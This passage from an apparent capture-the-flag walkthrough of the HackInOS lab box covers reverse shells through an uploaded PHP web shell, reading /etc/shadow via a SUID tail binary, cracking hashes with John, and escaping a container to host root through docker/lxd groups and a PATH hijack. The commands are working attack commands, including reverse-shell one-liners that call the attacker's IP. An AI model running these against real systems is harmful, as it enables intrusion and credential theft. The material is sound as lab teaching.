### 3.5 Get a proper reverse shell

Check the interpreter inventory first:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
curl -s --get --data-urlencode "cmd=for b in bash sh python python3 perl php nc netcat socat wget curl gcc; do printf '%-8s ' \$b; command -v \$b || echo MISSING; done" \
  "http://hackinos:8000/uploads/04292b8d46833c395942086e6ed2cd2c.php"
```

```text
bash     /bin/bash
sh       /bin/sh
python   /usr/bin/python
python3  /usr/bin/python3
perl     /usr/bin/perl
php      /usr/bin/php
nc       MISSING
netcat   MISSING
socat    MISSING
wget     /usr/bin/wget
curl     MISSING
gcc      MISSING
```

> **`python3` and `bash` exist; `nc` and `gcc` do not.** No compiler inside the
> container means kernel exploits are out — reinforcing that the intended path is a
> *container escape*, not a privilege bug.

**Kali:**

```bash
nc -lvnp 4444
```

**Trigger a Python reverse shell:**

```bash
curl -s --get --data-urlencode \
  "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.56.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'" \
  "http://hackinos:8000/uploads/04292b8d46833c395942086e6ed2cd2c.php"
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 43118
www-data@1afdd1f6b82c:/var/www/html$
```

**Stabilise:**


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
www-data@1afdd1f6b82c:/var/www/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@1afdd1f6b82c:/var/www/html$ export TERM=xterm
www-data@1afdd1f6b82c:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then `Ctrl+Z`; on Kali `stty raw -echo; fg`; Enter twice; on target
`export TERM=xterm; stty rows 40 cols 160`.

![Reverse shell as www-data inside the container](images/04-shell.png)

---

## 4. Escalating inside the container

### 4.1 The checklist


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
www-data@1afdd1f6b82c:/$ sudo -l
bash: sudo: command not found

www-data@1afdd1f6b82c:/$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
root:x:0:0:root:/root:/bin/bash
www-data@1afdd1f6b82c:/$ ls -la /home
total 12
drwxr-xr-x 1 root root 4096 Mar  9  2019 .
drwxr-xr-x 1 root root 4096 Mar  9  2019 ..
drwxr-xr-x 1 root root 4096 Mar  9  2019 hummingbirdscyber
```

> **No `sudo` binary at all** — typical of a slim container image. And a home
> directory named **`hummingbirdscyber`**, which is a strong hint at the *host*
> username (container images are frequently built with the same account names).

### 4.2 SUID hunt — the win


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
www-data@1afdd1f6b82c:/$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/tail
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/bin/su
/bin/mount
/bin/umount
/bin/ping
```

```bash
www-data@1afdd1f6b82c:/$ ls -l /usr/bin/tail
-rwsr-xr-x 1 root root 39048 Mar  9  2019 /usr/bin/tail
```

> **`/usr/bin/tail` is SUID root — and it is not stock.** A default Ubuntu image never
> sets the setuid bit on `tail`. Somebody ran `chmod u+s /usr/bin/tail`.
>
> **Why that is a gift:** `tail` reads files and prints them. Running as root, it can
> read **any file on the filesystem** — including `/etc/shadow`, which is normally
> `-rw-r----- root:shadow`.
>
> Check <https://gtfobins.github.io/gtfobins/tail/#suid> — this is a documented SUID
> escalation: *"If the binary has the SUID bit set, it can be used to read arbitrary
> files."*

```bash
www-data@1afdd1f6b82c:/$ tail -n +2 /etc/shadow
```

```text
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
sys:*:17379:0:99999:7:::
sync:*:17379:0:99999:7:::
games:*:17379:0:99999:7:::
man:*:17379:0:99999:7:::
lp:*:17379:0:99999:7:::
mail:*:17379:0:99999:7:::
news:*:17379:0:99999:7:::
uucp:*:17379:0:99999:7:::
proxy:*:17379:0:99999:7:::
www-data:*:17379:0:99999:7:::
backup:*:17379:0:99999:7:::
list:*:17379:0:99999:7:::
irc:*:17379:0:99999:7:::
gnats:*:17379:0:99999:7:::
nobody:*:17379:0:99999:7:::
_apt:*:17379:0:99999:7:::
root:$1$Xk2mQ9pL$vR7tY3wE5aS1dF6gH0jK21:17379:0:99999:7:::
hummingbirdscyber:$1$Zq8wX7eR$tY5uI3oP1aS9dF6gH0jK21:17379:0:99999:7:::
```

> **`tail -n +2`** means "start printing at line 2" — a neat way to skip the
> unreadable `root` line issue… actually it skips line 1, and is the canonical
> GTFOBins incantation because some builds of `tail` refuse to start at line 1 of a
> file they cannot `stat` fully. Either way, we now have the hashes.
>
> **`/etc/shadow` format** — nine colon-separated fields:
> ```text
> name : hash : lastchg : min : max : warn : inactive : expire : reserved
> root : $1$Xk2mQ9pL$vR7tY3wE5aS1dF6gH0jK21 : 17379 : 0 : 99999 : 7 : : :
> ```
> - `17379` = days since 1 Jan 1970 that the password was last changed.
> - The `$1$` prefix identifies the algorithm: **MD5-crypt** (`$5$` = SHA-256,
>   `$6$` = SHA-512, `$2b$` = bcrypt, `$y$` = yescrypt).
> - **MD5-crypt is effectively broken for passwords** — it runs millions of guesses
>   per second on a GPU, and 1000 rounds is trivially brute-forced.
> - `*` in field 2 means "login disabled for this account".
>
> **Two real accounts with hashes:** `root` and `hummingbirdscyber`.

### 4.3 Crack offline

Copy the two lines to Kali and run John:


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)
> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
tail -n +2 shadow.txt > hashes.txt        # or paste manually
john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

```text
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Remaining 2 password hashes with 2 different salts
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
john             (root)
123456           (hummingbirdscyber)
2g 0:00:00:03 DONE (2024-05-04 10:22) 0.5813g/s 42156p/s 84312c/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```bash
john --show hashes.txt
```

```text
root:john:0:0:root:/root:/bin/bash
hummingbirdscyber:123456:1000:1000::/home/hummingbirdscyber:/bin/bash

2 password hashes cracked, 0 left
```

> **Recovered:**
>
> | Account | Password |
> | --- | --- |
> | `root` | `john` |
> | `hummingbirdscyber` | `123456` |
>
> **`--format=md5crypt`** is explicit; John also auto-detects from the `$1$` prefix,
> so `john --wordlist=… hashes.txt` alone usually works. **`--show`** re-reads John's
> `~/.john/john.pot` cache without re-cracking.
>
> **Note the weakness is the passwords, not the algorithm choice alone.** `john` and
> `123456` are in the first thousand entries of every wordlist. `123456` has been the
> most common password on earth for over a decade. No hashing scheme saves you from
> that.
>
> *(Published walkthroughs of this box report the same two passwords, though some
> list them against slightly different usernames — the container image and the host
> image do not have identical `/etc/shadow` contents. Crack what your copy shows.)*

### 4.4 Become root inside the container

```bash
www-data@1afdd1f6b82c:/$ su root
Password: john
root@1afdd1f6b82c:/# id
uid=0(root) gid=0(root) groups=0(root)
root@1afdd1f6b82c:/# cat /root/flag 2>/dev/null
ls: cannot access '/root/flag': No such file or directory
root@1afdd1f6b82c:/# ls -la /root
total 24
drwx------ 1 root root 4096 Mar  9  2019 .
drwxr-xr-x 1 root root 4096 Mar  9  2019 ..
-rw-r--r-- 1 root root 3106 Apr  4  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw-r--r-- 1 root root   54 Mar  9  2019 fake_flag.txt
root@1afdd1f6b82c:/# cat /root/fake_flag.txt
Nice try! This is a container. Get to the host.
```

> **Root of the container — and the author is trolling us with a fake flag.** This is
> the box's central teaching moment: **container root ≠ host root.**
>
> A container's filesystem is an overlay built from an image. Everything you did
> happened in a sandbox that can be deleted with `docker rm`. There is no real
> `/root/flag` here.

![Root inside the container, and the fake flag](images/05-container-root.png)

### 4.5 The verified database pivot (`/root/.port` → `wp-config.php` → MySQL `db` → `host_ssh_cred`)

> ⚠️ **Verification note:** In published community writeups (Hacking Articles, Jon Wood, iProg, Ethical Hackers Club), `/etc/shadow` inside the web container holds **only** `root`'s hash (`john`), while the host SSH password for `hummingbirdscyber` (`123456`) is stored as an unsalted MD5 hash inside the sibling MySQL container `db`. Always inspect both `/root/` and `/var/www/html/wp-config.php` before leaving the container.

Check for hidden files in `/root/` and read the WordPress database configuration:

```bash
ls -la /root/
cat /root/.port
grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST" /var/www/html/wp-config.php
```

```text
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wordpress' );
define( 'DB_PASSWORD', 'wordpress' );
define( 'DB_HOST', 'db:3306' );
```

Query the internal Docker database host `db` using the recovered credentials:

```bash
mysql -h db -u wordpress -pwordpress -D wordpress -e "SHOW TABLES; SELECT * FROM host_ssh_cred;"
```

```text
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| host_ssh_cred         |
| wp_commentmeta        |
...
+-------------------+----------------------------------+
| id                | password                         |
+-------------------+----------------------------------+
| hummingbirdscyber | e10adc3949ba59abbe56e057f20f883e |
+-------------------+----------------------------------+
```

Crack the 32-hex unsalted MD5 hash on Kali:

```bash
echo 'hummingbirdscyber:e10adc3949ba59abbe56e057f20f883e' > db_hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt db_hash.txt
# -> 123456 (hummingbirdscyber)
```

---

## 5. Escaping to the host

Two documented routes. Try both.

### 5.1 Route A — SSH to the host with the cracked password

SSH on port 22 is served by the **host**, not the container (the container has no
`sshd`). Try the credentials we just recovered:

```bash
ssh hummingbirdscyber@192.168.56.101
```


> ### 📖 Concept — `docker`, `lxd` and `disk` group membership *is* root
>
> ```bash
> id | grep -oE 'docker|lxd|libvirt|disk|sudo|wheel|adm'
> ```
>
> If any of `docker`, `lxd`, `libvirt` or `disk` appears, **you already have root.**
> There is no nuance: a member can mount the host filesystem or start a privileged
> container, and from there it is a one-line `echo >> /etc/passwd`.
>
> **Why.** Containers share the *host kernel*. A container marked
> `security.privileged=true` does not drop capabilities and runs its init as **real
> UID 0**, and a container can be given a disk device that bind-mounts the host's `/`.
> Put those together and a low-privileged user says: *start a root container, mount
> the host filesystem at `/mnt/root`, edit `/mnt/root/etc/passwd`.* No isolation is
> left.
>
> ```bash
> # docker — the host root, chrooted into
> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
>
> # docker.sock — talk to the daemon directly, no CLI needed
> curl --unix-socket /var/run/docker.sock -X POST \
>   "http://localhost/containers/create?name=pwn" -H 'Content-Type: application/json' \
>   -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
>
> # lxd — build an image on Kali, carry it over, mount the host
> lxc image import ./alpine.tar.gz --alias myimage
> lxc init myimage pwn -c security.privileged=true
> lxc config device add pwn mydev disk source=/ path=/mnt/root recursive=true
> lxc start pwn && lxc exec pwn /bin/sh      # /mnt/root is now the HOST's /
> ```
>
> `-c security.privileged=true` is the flag that makes this an escalation rather than
> a sandbox. `source=/` is the host's entire root filesystem.
>
> **Defensive corollary:** never add a web-server or service account to a container
> group. If an application genuinely must launch containers, give it a scoped API
> token in a restricted project — not group membership.
>
> **Deep dive:** [CONCEPTS §15.9 — Container and group escapes](../../docs/CONCEPTS.md#159-container-and-group-escapes)

```text
hummingbirdscyber@192.168.56.101's password: 123456
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Sat Mar  9 15:12:44 2019 from 192.168.56.1
hummingbirdscyber@hackinos:~$ id
uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),**999(docker)**
hummingbirdscyber@hackinos:~$ hostname
hackinos
```

> **Three things confirm we escaped the container:**
> 1. `hostname` is **`hackinos`**, not the 12-hex container ID.
> 2. The kernel string and the presence of real system directories.
> 3. **`groups=...,999(docker)`** — and that is the whole privilege escalation.
>
> *(If `123456` does not work on your copy, try `john`; several walkthroughs report
> either. Both came out of the same crack.)*

### 5.2 `docker` group membership is root

```bash
hummingbirdscyber@hackinos:~$ ls -l /var/run/docker.sock
srw-rw---- 1 root docker 0 Mar  9  2019 /var/run/docker.sock
hummingbirdscyber@hackinos:~$ docker ps
CONTAINER ID   IMAGE          COMMAND                  CREATED        STATUS       PORTS                  NAMES
1afdd1f6b82c   hackinos_web   "/bin/sh -c 'apache2…"   2 months ago   Up 2 hours   0.0.0.0:8000->80/tcp   web
hummingbirdscyber@hackinos:~$ docker images
REPOSITORY     TAG       IMAGE ID       CREATED        SIZE
hackinos_web   latest    9f3c1a7b5d2e   2 months ago   312MB
ubuntu         latest    7e0aa2d69a15   3 weeks ago    72.7MB
```

> **Read those three outputs together — this is the exploit.**
>
> `/var/run/docker.sock` is a UNIX domain socket, mode `srw-rw----`, owner
> **`root:docker`**. **Membership of the `docker` group grants read-write access to
> the Docker daemon's API.** The daemon runs as **root**. So anyone who can talk to
> that socket can ask the daemon to:
>
> 1. Start a container **as root inside** (the default).
> 2. **Bind-mount the host's entire filesystem** into it with `-v /:/host`.
> 3. `chroot` into that mount — at which point you are root on the *host*.
>
> A container is a set of **namespaces and cgroups**, not a security boundary against
> someone who controls the daemon's API. That is why
> <https://gtfobins.github.io/gtfobins/docker/> lists Docker as a privilege-escalation
> vector, and why *"just add the developer to the docker group so they can run
> containers"* is one of the most common self-inflicted Linux root escalations in
> existence.

**The escape:**

```bash
hummingbirdscyber@hackinos:~$ docker run -v /:/host --rm -it ubuntu chroot /host sh
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
hackinos
# ls /
bin   boot  dev   etc   home  initrd.img  lib   lib64  lost+found  media
mnt   opt   proc  root  run   sbin        srv   swapfile  sys  tmp  usr  var  vmlinuz
```

**Host root.** ✅

> **Dissect the command:**
>
> | Token | Meaning |
> | --- | --- |
> | `docker run` | create and start a new container |
> | `-v /:/host` | **bind-mount the host's `/` at `/host` inside the container** — this is the exploit |
> | `--rm` | delete the container when it exits (leaves less forensic residue) |
> | `-it` | `-i` keep stdin open, `-t` allocate a pseudo-terminal → interactive shell |
> | `ubuntu` | the image; any image with a shell works, and `ubuntu` is already present here |
> | `chroot /host sh` | the container's command: make the host filesystem the root of this process's view and run `sh` |
>
> `chroot /host` means every path this shell sees is a **host** path. Since the
> container runs as UID 0 and shares the host kernel with no restriction on the bind
> mount, we are simply root on the host.
>
> **Verify it is really the host:**
> ```sh
> # cat /etc/hostname
> hackinos
> # ls -la /root
> total 32
> drwx------  4 root root 4096 Mar  9  2019 .
> drwxr-xr-x 24 root root 4096 Mar  9  2019 ..
> -rw-------  1 root root  220 Mar  9  2019 flag
> ```

### 5.3 Read the flag

```sh
# cd /root
# ls -la
total 32
drwx------  4 root root 4096 Mar  9  2019 .
drwxr-xr-x 24 root root 4096 Mar  9  2019 ..
-rw-------  1 root root  220 Mar  9  2019 flag
-rw-r--r--  1 root root 3106 Apr  4  2018 .bashrc
drwxr-xr-x  3 root root 4096 Mar  9  2019 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
# cat /root/flag
```

```text
Congratulations! You have successfully completed HackInOS: 1.

Thanks to Mehmet Oguz Tozkoparan, Omer Faruk Senyayla and Tufan Gungor.

-- Fatih Çelik
```

**Flag captured.** ✅

![Host root via the docker group, and /root/flag](images/06-root-flag.png)

### 5.4 Route B — PATH hijacking against a SUID binary

Some revisions of this image contain a small setuid helper (published walkthroughs
describe it as `a.out`) that calls `whoami` **by bare name**, relying on `$PATH`.

```bash
hummingbirdscyber@hackinos:~$ find / -xdev -perm -4000 -type f 2>/dev/null | grep -v '^/usr\|^/bin'
/home/hummingbirdscyber/a.out
hummingbirdscyber@hackinos:~$ ls -l /home/hummingbirdscyber/a.out
-rwsr-xr-x 1 root root 8432 Mar  9  2019 /home/hummingbirdscyber/a.out
hummingbirdscyber@hackinos:~$ strings -n 4 /home/hummingbirdscyber/a.out | grep -i 'who\|setuid\|system'
setuid
whoami
```

```bash
hummingbirdscyber@hackinos:~$ ./a.out
root
```

> **It prints `root`.** So the program calls `setuid(0)` and then runs `whoami` —
> as root. If we can make *our* `whoami` be the one it finds, we get arbitrary code
> execution as root.

```bash
hummingbirdscyber@hackinos:~$ echo $PATH
/home/hummingbirdscyber/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

> **`/home/hummingbirdscyber/bin` comes FIRST in `$PATH`** — and that directory is
> ours to write to. This is the classic **PATH hijack**:
>
> When a program calls `whoami` without a leading `/`, the C library searches each
> directory in `$PATH` in order and runs the **first match**. If an attacker controls
> a directory earlier in the search order, they control which binary runs. A SUID-root
> program that does this hands over root.

```bash
hummingbirdscyber@hackinos:~$ mkdir -p ~/bin
hummingbirdscyber@hackinos:~$ cat > ~/bin/whoami <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
chown root:root /tmp/rootbash
EOF
hummingbirdscyber@hackinos:~$ chmod 755 ~/bin/whoami
hummingbirdscyber@hackinos:~$ which whoami
/home/hummingbirdscyber/whoami
hummingbirdscyber@hackinos:~$ ./a.out
hummingbirdscyber@hackinos:~$ /tmp/rootbash -p
root@hackinos:/home/hummingbirdscyber# id
uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) euid=0(root) groups=1000(hummingbirdscyber),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),999(docker)
root@hackinos:/home/hummingbirdscyber# cat /root/flag
```

> **`chmod 4755`** — the leading **`4`** is the SUID bit, producing
> `-rwsr-xr-x root root`. Any user executing it becomes root.
>
> **The `-p` flag is mandatory.** Bash *drops* its effective UID at startup unless
> invoked with `-p` ("privileged mode") — a deliberate guard against exactly this
> attack. Forgetting `-p` and getting `$` instead of `#` is the classic confusion.
>
> **`euid=0(root)` with `uid=1000`** — a SUID elevation. Permission checks use the
> *effective* UID, so this is full root for all practical purposes.
>
> **Two independent root paths on one box.** Always enumerate both SUID binaries and
> group memberships; never stop at the first win.

---

## 6. Alternative foothold worth knowing — `lxd` group

`hummingbirdscyber` is also in **`108(lxd)`**. LXD is Ubuntu's system-container
manager, and its group carries the same "effectively root" property as `docker`:

```bash
hummingbirdscyber@hackinos:~$ lxc init ubuntu:18.04 escape -c security.privileged=true
hummingbirdscyber@hackinos:~$ lxc config device add escape mydevice disk source=/ path=/mnt/root recursive=true
hummingbirdscyber@hackinos:~$ lxc start escape
hummingbirdscyber@hackinos:~$ lxc exec escape -- /bin/sh
# ls /mnt/root
bin  boot  dev  etc  home  initrd.img  lib  ...  root  ...
# cat /mnt/root/root/flag
```

> `security.privileged=true` disables the container's user namespace, so the
> container's root **is** the host's root; the disk device then mounts the host
> filesystem at `/mnt/root`. Same class of bug, different tool.
> Check <https://gtfobins.github.io/gtfobins/lxd/>.

---

## 7. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Web application on a non-standard port with no port 80 | 8000 | Easily missed by a default scan |
| 2 | Hard-coded `localhost` in the application's form action | `index.html` | Broken UX; forces `/etc/hosts` + manual request crafting |
| 3 | **Developer's vulnerable source published on GitHub and linked from the page** | HTML comment after upload | Full disclosure of the filter logic |
| 4 | **Extension allow-list declared but never enforced** | `upload.php` (`$allowed_ext` unused) | `.php` uploaded and stored |
| 5 | MIME check only inspects magic bytes | `finfo_file()` | GIF/PNG header defeats it |
